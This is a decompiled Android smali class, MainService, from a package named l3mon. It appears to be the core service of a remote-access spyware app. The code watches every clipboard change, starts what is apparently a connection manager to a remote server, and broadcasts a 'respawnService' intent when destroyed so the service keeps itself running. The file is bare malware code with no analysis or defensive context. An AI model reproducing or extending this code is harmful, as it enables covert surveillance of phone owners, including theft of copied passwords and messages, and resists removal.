.class public Lcom/etechd/l3mon/MainService;
.super Landroid/app/Service;
.source "MainService.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/etechd/l3mon/MainService$100000000;
    }
.end annotation


# static fields
.field private static contextOfApplication:Landroid/content/Context;


# direct methods
.method public constructor <init>()V
    .locals 3

    .prologue
    .line 25
    move-object v0, p0

    move-object v2, v0

    invoke-direct {v2}, Landroid/app/Service;-><init>()V

    return-void
.end method

.method public static getContextOfApplication()Landroid/content/Context;
    .locals 3

    .prologue
    .line 82
    sget-object v2, Lcom/etechd/l3mon/MainService;->contextOfApplication:Landroid/content/Context;

    move-object v0, v2

    return-object v0
.end method


# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 4
    .annotation runtime Ljava/lang/Override;
    .end annotation

    .prologue
    .line 33
    move-object v0, p0

    move-object v1, p1

    const/4 v3, 0x0

    check-cast v3, Landroid/os/IBinder;

    move-object v0, v3

    return-object v0
.end method

.method public onDestroy()V
    .locals 7
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()V"
        }
    .end annotation

    .annotation runtime Ljava/lang/Override;
    .end annotation

    .prologue
    .line 76
    move-object v0, p0

    move-object v2, v0

    invoke-super {v2}, Landroid/app/Service;->onDestroy()V

    .line 77
    move-object v2, v0

    new-instance v3, Landroid/content/Intent;

    move-object v6, v3

    move-object v3, v6

    move-object v4, v6

    const-string v5, "respawnService"

    invoke-direct {v4, v5}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2, v3}, Lcom/etechd/l3mon/MainService;->sendBroadcast(Landroid/content/Intent;)V

    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 12
    .annotation runtime Ljava/lang/Override;
    .end annotation

    .prologue
    .line 44
    move-object v0, p0

    move-object v1, p1

    move v2, p2

    move v3, p3

    new-instance v8, Lcom/etechd/l3mon/MainService$100000000;

    move-object v11, v8

    move-object v8, v11

    move-object v9, v11

    move-object v10, v0

    invoke-direct {v9, v10}, Lcom/etechd/l3mon/MainService$100000000;-><init>(Lcom/etechd/l3mon/MainService;)V

    move-object v5, v8

    .line 65
    move-object v8, v0

    const-string v9, "clipboard"

    invoke-virtual {v8, v9}, Lcom/etechd/l3mon/MainService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v8

    check-cast v8, Landroid/content/ClipboardManager;

    move-object v6, v8

    .line 66
    move-object v8, v6

    move-object v9, v5

    invoke-virtual {v8, v9}, Landroid/content/ClipboardManager;->addPrimaryClipChangedListener(Landroid/content/ClipboardManager$OnPrimaryClipChangedListener;)V

    .line 69
    move-object v8, v0

    sput-object v8, Lcom/etechd/l3mon/MainService;->contextOfApplication:Landroid/content/Context;

    .line 70
    move-object v8, v0

    invoke-static {v8}, Lcom/etechd/l3mon/ConnectionManager;->startAsync(Landroid/content/Context;)V

    .line 71
    const/4 v8, 0x1

    move v0, v8

    return v0
.end method
